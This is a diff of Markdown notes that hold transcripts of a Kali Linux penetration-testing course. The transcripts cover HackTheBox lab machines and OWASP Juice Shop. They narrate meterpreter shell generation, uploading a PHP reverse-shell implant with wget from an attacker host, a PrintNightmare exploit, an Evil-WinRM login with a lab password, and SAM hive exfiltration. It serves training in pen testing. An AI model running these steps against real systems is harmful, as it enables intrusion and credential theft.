 > **[0:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=51)** Ls, ls.
 >
-> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=54)** Oh, we can see an [ASP.NET](https://ASP.NET) client folder and an IIS start file.
+> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=54)** Oh, we can see an [[[ASP.NET]]](https://ASP.NET) client folder and an IIS start file.
 >
 > **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=61)** Let's have a look in the [ASP.NET](https://ASP.NET) client and see what's there.
 >
@@ -2762,11 +2730,11 @@ created: 2026-05-02
 >
 > **[3:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=196)** And let's have a look at what users Babis has, and it's empty.
 >
-> **[3:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=205)** We've got our users shell, but we need to get privileges to find our tokens.
+> **[3:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=205)** We've got our users shell, but we need to get privileges to find our [[Tokens]].
 >
 > **[3:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=210)** Using the Aspen implant is all very well, but we need more.
 >
-> **[3:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=215)** Let's use msfvenom to get ourselves a meterpreter shell that we can use for privilege escalation.
+> **[3:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=215)** Let's use [[Metasploit|msfvenom]] to get ourselves a meterpreter shell that we can use for privilege escalation.
 >
 > **[3:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=221)** We'll make this an ASPX Shell.
 >
@@ -2788,7 +2756,7 @@ created: 2026-05-02
 >
 > **[4:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=288)** I'll exit out of that.
 >
-> **[4:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=290)** And let's set up a meterpreter listener and we'll use msfconsole for that, Metasploit.
+> **[4:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=290)** And let's set up a meterpreter listener and we'll use [[Metasploit|msfconsole]] for that, [[Metasploit]].
 >
 > **[5:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=300)** And we'll use exploits/multi/handler.
 >
@@ -2864,7 +2832,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (8), [[ASP.NET]] (3), web (3), next (1), [[Tokens]] (1)
+> **Frameworks & Libraries:** [[Windows]] (8), [[ASP.NET]] (3), [[Nmap]] (2), [[Metasploit|Msfvenom]] (2), [[Tokens]] (1)
 > **Env Vars:** ftp (5), asp (4), net (3), iis (3), aspx (3)
 > **Versions:** 10.10.10 (5), 10.10.14 (3)
 > **CLI Commands:** ls (4), find (2), make (1)
@@ -2873,8 +2841,7 @@ created: 2026-05-02
 > **Ports:** port 21 (1), port 80 (1)
 > **Speakers:** - [instructor] (1), - ps (1)
 
-#### Time to exploit Cronos
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980)
+#### [Time to exploit Cronos](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2882,9 +2849,9 @@ created: 2026-05-02
 >
 > **[0:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=6)** This is an example of a more complex target in which deeper enumeration and spending time researching the target applications is the key to getting access.
 >
-> **[0:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=16)** Once again, the first thing we'll do is run nmap to find out what we're targeting and we'll use the minus A switch to get the full details of the services nmap -A -PS -A 10.10.10.13.
+> **[0:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=16)** Once again, the first thing we'll do is run [[Nmap]] to find out what we're targeting and we'll use the minus A switch to get the full details of the services nmap -A -PS -A 10.10.10.13.
 >
-> **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=35)** We have a Linux host with ports 22, 53 and 80 open.
+> **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=35)** We have a [[Linux]] host with ports 22, 53 and 80 open.
 >
 > **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=40)** There's not much more obvious information here.
 >
@@ -2894,7 +2861,7 @@ created: 2026-05-02
 >
 > **[0:53](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=53)** There's nothing to see here.
 >
-> **[0:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=56)** We might start running Gobuster to see if we can find any hidden pages but before we do that, let's reflect on what we've found already.
+> **[0:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=56)** We might start running [[Gobuster]] to see if we can find any hidden pages but before we do that, let's reflect on what we've found already.
 >
 > **[1:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=65)** We have a website which has port 53 open, and this may indicate there's more than just one website being served up.
 >
@@ -2902,7 +2869,7 @@ created: 2026-05-02
 >
 > **[1:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=78)** And this information page indicates we can use the hosts file to access the name site.
 >
-> **[1:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=86)** In reality, we'd need to do a bit of open source intelligence to find out more, but let's take a guess and say that 10.10.10.13, maybe a server for multiple virtual hosts and one of them's called cronos.htb.
+> **[1:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=86)** In reality, we'd need to do a bit of open source intelligence to find out more, but let's take a guess and say that 10.10.10.13, maybe a server for multiple virtual hosts and one of them's called cronos.[[HackTheBox|htb]].
 >
 > **[1:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=101)** I'll add this to my /etc/hosts file.
 >
@@ -2962,7 +2929,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** next (2), [[Linux]] (1), web (1), data (1)
+> **Frameworks & Libraries:** [[HackTheBox|Htb]] (12), [[Nmap]] (2), [[Linux]] (1), [[Gobuster]] (1)
 > **CLI Commands:** find (6), ls (3), apache (2), sudo (1), cat (1)
 > **Versions:** 10.10.10 (7)
 > **Definitions:** known as (1), is an  (1), is a  (1)
@@ -2971,8 +2938,7 @@ created: 2026-05-02
 > **Env Vars:** axfr (1)
 > **Tools:** command line (1)
 
-#### Cronos revisited: Getting to the root
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980)
+#### [Cronos revisited: Getting to the root](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2984,11 +2950,11 @@ created: 2026-05-02
 >
 > **[0:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=5)** And to do this we'll want to have a user shell.
 >
-> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=8)** It turns out that Cronos doesn't allow the use of the minus C switch on netcat.
+> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=8)** It turns out that Cronos doesn't allow the use of the minus C switch on [[Netcat]].
 >
 > **[0:13](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=13)** So we can't force a reverse shell.
 >
-> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=15)** However, it does support PHP, so we can use wget to upload our Shelly implant.
+> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=15)** However, it does support [[PHP]], so we can use wget to upload our Shelly implant.
 >
 > **[0:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=22)** I've got shelly.php ready with the correct IP address in port.
 >
@@ -3000,7 +2966,7 @@ created: 2026-05-02
 >
 > **[0:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=44)** And I'll start a web server on port 80.
 >
-> **[0:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=48)** Python -m SimpleHTTPServer port 80.
+> **[0:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=48)** [[Python (Programming Language)|Python]] -m SimpleHTTPServer port 80.
 >
 > **[0:58](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=58)** Okay, let's upload our shell.
 >
@@ -3022,7 +2988,7 @@ created: 2026-05-02
 >
 > **[1:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=117)** Let's see what websites we have, ls /var/www.
 >
-> **[2:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=125)** And we can see the main website, and the admin website, and also one called laravel.
+> **[2:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=125)** And we can see the main website, and the admin website, and also one called [[Laravel]].
 >
 > **[2:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=131)** Let's do a bit of research on Laravel.
 >
@@ -3116,7 +3082,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (16), [[Laravel]] (5), web (4), [[Python (Programming Language)|Python]] (1), data (1)
+> **Frameworks & Libraries:** [[PHP]] (16), [[Laravel]] (5), [[Netcat]] (2), [[Python (Programming Language)|Python]] (1)
 > **CLI Commands:** php (16), wget (2), ls (2), make (1), python (1)
 > **File Paths:** kernel.php (7), shelly.php (5), shelly.txt (3), myroot.txt (3), var/www/admin/myroot.txt (3)
 > **Env Vars:** php (4), http (1)
@@ -3125,8 +3091,7 @@ created: 2026-05-02
 > **Ports:** port 80 (2)
 > **URLs:** [http://10.10.14.2/shelly.txt](http://10.10.14.2/shelly.txt) (1)
 
-#### Using a nightmare escalator
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980)
+#### [Using a nightmare escalator](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3144,7 +3109,7 @@ created: 2026-05-02
 >
 > **[0:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=31)** Its IP address is 10.10.10.149.
 >
-> **[0:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=36)** The first thing we need to do is download the PrintNightmare proof of concept, which we'll rename to just nightmare, sudo git clone [https://github.com/calebstewart/CVE-2021](https://github.com/calebstewart/CVE-2021)-
+> **[0:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=36)** The first thing we need to do is download the PrintNightmare proof of concept, which we'll rename to just nightmare, sudo [[Git]] clone [https://[[GitHub]].com/calebstewart/CVE-2021](https://github.com/calebstewart/CVE-2021)-
 >
 > **[1:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=60)** 1675.git, and we'll call it just nightmare.
 >
@@ -3154,7 +3119,7 @@ created: 2026-05-02
 >
 > **[1:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=78)** The user is called chase, the domain name is supportdesk, and we know the password.
 >
-> **[1:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=84)** We'll connect to the server using a pen testing client for Windows Management called Evil WinRM.
+> **[1:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=84)** We'll connect to the server using a pen testing client for [[Windows]] Management called Evil WinRM.
 >
 > **[1:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=90)** We can install this as a RubyGem, sudo gem install evil-winrm.
 >
@@ -3164,7 +3129,7 @@ created: 2026-05-02
 >
 > **[2:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=121)** supportdesk\\chase -p 'Q4}sJu\Y8qz*A3?d'.
 >
-> **[2:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=143)** Okay, we now have command line access to the target, and we're using PowerShell.
+> **[2:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=143)** Okay, we now have command line access to the target, and we're using [[Powershell]].
 >
 > **[2:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=150)** Let's upload the exploit from calebstewart, upload nightmare/CVE-2021-1675.ps1.
 >
@@ -3186,7 +3151,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Git]] (2), [[Windows]] (2), [[Powershell]] (2), teams (1), [[GitHub]] (1)
+> **Frameworks & Libraries:** [[Git]] (2), [[Windows]] (2), [[Powershell]] (2), [[GitHub]] (1)
 > **CLI Commands:** sudo (2), git (2), cat (1)
 > **Tools:** powershell (2), github (1), command line (1), terminal (1)
 > **Env Vars:** cve (3)
@@ -3200,8 +3165,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Introducing kali-autopilot
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980)
+#### [Introducing kali-autopilot](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3209,7 +3173,7 @@ created: 2026-05-02
 >
 > **[0:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=6)** Rather than manually run attack commands.
 >
-> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=8)** We can use a tool called Kali-autopilot, which will generate a Python attack script to automate the attack.
+> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=8)** We can use a tool called Kali-autopilot, which will generate a [[Python (Programming Language)|Python]] attack script to automate the attack.
 >
 > **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=15)** We'll use our virtual box lap for our initial introduction to Kali-autopilot.
 >
@@ -3229,7 +3193,7 @@ created: 2026-05-02
 >
 > **[1:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=74)** Let's create a new attack plan.
 >
-> **[1:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=76)** I've prepared a target server on IP address, 10 dot naught dot two dot 40 using the OWASP Juice Shop system shown here.
+> **[1:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=76)** I've prepared a target server on IP address, 10 dot naught dot two dot 40 using the [[OWASP]] Juice Shop system shown here.
 >
 > **[1:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=84)** In a real attack, the attacker would run a command at their workstation, check the output, and then decide what to do next.
 >
@@ -3283,7 +3247,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** management (2), [[Python (Programming Language)|Python]] (1), [[OWASP]] (1), next (1), [[Debugging]] (1)
+> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (1), [[OWASP]] (1)
 > **CLI Commands:** make (2), python (1), sudo (1), apt (1)
 > **Env Vars:** apt (1), owasp (1), eth (1)
 > **UI Navigation:** checkbox (1)
@@ -3292,8 +3256,7 @@ created: 2026-05-02
 > **Prerequisites:** install (1)
 > **Speakers:** - [instructor] (1)
 
-#### Scripting a juicy attack
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980)
+#### [Scripting a juicy attack](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3319,7 +3282,7 @@ created: 2026-05-02
 >
 > **[0:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=56)** We can run it through to completion, or we can include additional STAGE commands and run it in stages, which we may want to do when running a cyber range exercise, or a workshop.
 >
-> **[1:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=68)** Our first real command we'll code is to do a port scan of the juice server using Nmap.
+> **[1:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=68)** Our first real command we'll code is to do a port scan of the juice server using [[Nmap]].
 >
 > **[1:13](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=73)** We do this by entering OS, which is the operating system, command, and putting the command we want to run in the command field, in the same form as if we were running it at the command line.
 >
@@ -3333,11 +3296,11 @@ created: 2026-05-02
 >
 > **[1:55](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=115)** We don't need to capture them.
 >
-> **[1:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=117)** After running Nmap, our simulated attacker knows that Port 3000 is open and is running an HTTP service called OWASP Juice.
+> **[1:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=117)** After running Nmap, our simulated attacker knows that Port 3000 is open and is running an HTTP service called [[OWASP]] Juice.
 >
 > **[2:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=126)** The next thing our simulated attacker does is to enumerate the webpages.
 >
-> **[2:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=130)** So the next command we'll code is to run dirb.
+> **[2:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=130)** So the next command we'll code is to run [[Dirb]].
 >
 > **[2:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=137)** OS, dirb [http://{juice}:3000](http://{juice}:3000).
 >
@@ -3365,7 +3328,7 @@ created: 2026-05-02
 >
 > **[4:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=275)** Okay, let's save this. Save.
 >
-> **[4:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=281)** The final thing we need to do now is to generate the Python attack script.
+> **[4:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=281)** The final thing we need to do now is to generate the [[Python (Programming Language)|Python]] attack script.
 >
 > **[4:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=285)** And we can do this by pressing the generate button.
 >
@@ -3377,7 +3340,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** next (4), management (1), [[OWASP]] (1), [[Python (Programming Language)|Python]] (1)
+> **Frameworks & Libraries:** [[Nmap]] (3), [[Dirb]] (2), [[OWASP]] (1), [[Python (Programming Language)|Python]] (1)
 > **CLI Commands:** find (2), make (2), curl (2), wget (2), cat (1)
 > **Env Vars:** stage (3), http (1), owasp (1), ftp (1)
 > **Ports:** :3000 (3), port 3000 (1)
@@ -3386,8 +3349,7 @@ created: 2026-05-02
 > **Code Identifiers:** sv (1)
 > **Versions:** 10.0.2 (1)
 
-#### Attacking the juice shop
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980)
+#### [Attacking the juice shop](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3411,13 +3373,13 @@ created: 2026-05-02
 >
 > **[1:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=86)** So let's go back to our running script
 >
-> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=94)** and we can see we're running the nmap command and we're now running our dirb command and this is going to take a little while.
+> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=94)** and we can see we're running the [[Nmap]] command and we're now running our [[Dirb]] command and this is going to take a little while.
 >
 > **[1:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=104)** And we can see we've identified the FTP page and at the completion of the attack, we see the easter egg from the juice shop, or at least the contents of the file, which is partway to finding the real easter egg.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** api (3), cd (1), management (1)
+> **Frameworks & Libraries:** [[Nmap]] (1), [[Dirb]] (1)
 > **Env Vars:** api (3), ftp (1)
 > **CLI Commands:** cd (1), python3 (1)
 > **File Paths:** juicy.py (1)
@@ -3426,12 +3388,11 @@ created: 2026-05-02
 > **UI Navigation:** navigate to (1)
 > **Speakers:** - [instructor] (1)
 
-#### Hiving into Windows
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980)
+#### [Hiving into Windows](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=0)** - [Instructor] CVE 2021-36934 describes a privilege escalation attack on Windows 10, resulting from lax access rights on the Windows Configuration folder.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=0)** - [Instructor] CVE 2021-36934 describes a privilege escalation attack on [[Windows 10]], resulting from lax access rights on the [[Windows]] Configuration folder.
 >
 > **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=12)** It works by extracting the SAM system and security files and exfiltrating them to obtain the password hashes.
 >
@@ -3449,7 +3410,7 @@ created: 2026-05-02
 >
 > **[0:53](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=53)** In the Scripted Attack section, the initial access stage starts with the Stage 1 command.
 >
-> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=61)** We then run Nmap to check whether client02 is set up for remote management on port 5985, and we'll use the -p option to test the port, regardless of whether the server responds to a ping or not.
+> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=61)** We then run [[Nmap]] to check whether client02 is set up for remote management on port 5985, and we'll use the -p option to test the port, regardless of whether the server responds to a ping or not.
 >
 > **[1:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=75)** We'll then try out our stolen credentials to check whether they have remote management access.
 >
@@ -3461,7 +3422,7 @@ created: 2026-05-02
 >
 > **[1:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=98)** So we'll now run the icacls command to check whether the server is vulnerable to HiveNightmare by displaying access rights.
 >
-> **[1:47](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=107)** We use the action word command to run a command on the target, and we're specifying the shell number in which to run the command as we could have multiple shells open.
+> **[1:47](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=107)** We use the action [[Microsoft Word|word]] command to run a command on the target, and we're specifying the shell number in which to run the command as we could have multiple shells open.
 >
 > **[1:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=117)** If we get a permission failure, then the target isn't vulnerable, but in our case, it is, so we'll get a display of permissions.
 >
@@ -3489,7 +3450,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows 10]] (2), [[Security]] (2), management (2), [[Windows]] (1), prompt (1)
+> **Frameworks & Libraries:** [[Windows 10]] (2), [[Windows]] (1), [[Nmap]] (1), [[Microsoft Word|Word]] (1)
 > **Prerequisites:** set up (5)
 > **Env Vars:** sam (2), cve (1), smb (1)
 > **Ports:** port 5985 (1), port 8000 (1)
@@ -3498,8 +3459,7 @@ created: 2026-05-02
 > **Definitions:** is called (1)
 > **Speakers:** - [instructor] (1)
 
-#### Attacking the hives
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980)
+#### [Attacking the hives](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3531,7 +3491,6 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** management (1), [[Security]] (1)
 > **Env Vars:** sam (3), http (1)
 > **CLI Commands:** tar (2), python3 (1)
 > **File Paths:** hives.py (1)
@@ -3544,8 +3503,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Install Sliver server
